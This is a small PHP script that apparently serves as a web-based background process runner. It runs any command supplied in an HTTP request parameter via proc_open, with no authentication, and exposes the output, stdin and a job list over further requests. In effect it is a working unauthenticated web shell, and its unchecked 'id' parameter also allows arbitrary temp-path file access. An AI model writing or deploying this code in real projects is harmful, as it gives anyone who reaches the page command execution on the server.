<?php
function tmp(){
  return tempnam(sys_get_temp_dir(),'xpc');
}
function xproc_list_clean($s){
  return str_replace(sys_get_temp_dir().'/xout','', $s);
}
function xproc_open($id, $cmd){
  file_put_contents(sys_get_temp_dir().'/xin'.$id,'');
  $descriptorspec = array(
     0 => array("file", sys_get_temp_dir().'/xin'.$id, "r") ,   // stdin is a pipe that the child will read from
     1 => array("file", sys_get_temp_dir().'/xout'.$id, "a") ,  // stdout is a pipe that the child will write to
     2 => array("file", sys_get_temp_dir().'/xerr'.$id, "a")    // stderr is a file to write to
  );
  Proc_close(Proc_Open ($cmd.'&', $descriptorspec, $pipes, 'tmp/'));
}
  if(isset($_REQUEST['xproc'])){
    switch($_REQUEST['xproc']){
      case 'start':
        $cmd = explode(' ',$_REQUEST['cmd'],2)[1];
        $id = md5(microtime().$cmd);
        echo $id;
        xproc_open($id, $cmd);
      break;
      case 'poll':
        $id = $_REQUEST['id'];
        echo file_get_contents(sys_get_temp_dir().'/xout'.$id);
        echo file_get_contents(sys_get_temp_dir().'/xerr'.$id);
        file_put_contents(sys_get_temp_dir().'/xout'.$id,'');
        file_put_contents(sys_get_temp_dir().'/xerr'.$id,'');

        $input ="";
        foreach($_REQUEST['input'] as $i){
          $input .= chr($i);
        }
        if($input){
          file_put_contents(sys_get_temp_dir().'/xin'.$id,$input,FILE_APPEND);
        }
      break;
      case 'list':
        echo implode("\n",array_map('xproc_list_clean',glob(sys_get_temp_dir().'/xout*')));
      break;
    }
    exit();
  }
?>
